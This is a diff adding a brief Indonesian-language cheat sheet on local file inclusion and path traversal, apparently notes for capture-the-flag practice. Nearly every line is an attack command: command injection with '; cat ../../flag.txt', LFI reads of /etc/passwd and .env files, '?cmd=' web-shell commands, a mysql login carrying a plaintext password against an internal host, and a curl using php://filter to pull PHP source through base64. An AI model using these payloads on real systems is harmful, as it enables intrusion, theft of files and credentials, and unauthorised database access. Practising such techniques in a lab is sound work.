@@ -1,0 +1,18 @@
+# LFI-Path Traversal
+/ = dimulai dari root
+.. = dimulai dari directory saat ini
+; cat ../../flag.txt = (memisahkan command ping) membuka file flag.txt yang ada pada direktori 2 level saat ini)
+jika menemukan atau clue ?path=langsung jalankan saja LFI /etc/passwd
+Jika sudah upload file coba masukkan parameter ?cmd=id
+
+?cmd= find / -name FLAG*
+?cmd=cat /FLAG.txt	
+
+../.env biasanya 1 kali up folder
+
+mysql -h 192.168.9.19 -u klaimku_app -p'klaimku_app_pw' klaimku --ssl=0
+(menjalankan akeses console database mysql jika port 3306 mysql terbuka dan menemukan credential database)
+
+curl "http://192.168.9.19:8084/debug_viewer.php?path=php://filter/convert.base64-
+encode/resource=/var/www/html/includes/db.php" | base64 –d
+(merubah source code ke base64 kemudian ke plain text)
